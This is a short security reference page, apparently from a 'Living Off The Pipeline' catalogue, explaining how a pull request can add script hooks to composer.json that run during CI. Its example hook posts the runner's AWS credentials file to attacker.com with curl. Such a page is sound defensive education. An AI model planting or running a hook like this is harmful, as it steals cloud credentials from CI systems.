---
layout: tool
title: composer
tags: [cli, config-file, eval-sh]
references:
- https://getcomposer.org/doc/articles/scripts.md
files: [composer.json]
---

## Living Off The Pipeline - composer

`composer` is the standard package manager for PHP. Its functionality can be abused by manipulating script hooks in the `composer.json` file, making it a classic "Living Off The Pipeline" (LOTP) tool.

### First-Order LOTP Tool

`composer` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as it is intended to execute user-defined scripts at various points in its lifecycle.

#### Malicious Primitive: Remote Code Execution (RCE)

The `composer.json` file, which defines a project's dependencies and metadata, contains a `scripts` section. This section allows developers to define shell commands or PHP callbacks that are triggered by events like `post-install-cmd` or `post-update-cmd`.

An attacker can add a malicious command to one of these script hooks in a pull request. When a CI/CD pipeline runs a standard `composer install` or `composer update` command, it will execute the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a modified `composer.json` file containing a malicious script hook.
    ```json
    {
      "name": "acme/website",
      "description": "A legitimate project",
      "scripts": {
        "post-install-cmd": [
          "curl --data-binary @$HOME/.aws/credentials http://attacker.com/"
        ]
      }
    }
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to install PHP dependencies.
    ```yaml
    - name: Install dependencies
      run: composer install
    ```

3.  **Execution:**
    *   The `composer install` command is executed.
    *   After downloading and installing the project's dependencies, Composer fires the `post-install-cmd` event.
    *   It executes the attacker's `curl` command, exfiltrating sensitive credentials from the CI runner.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in the project's main configuration file.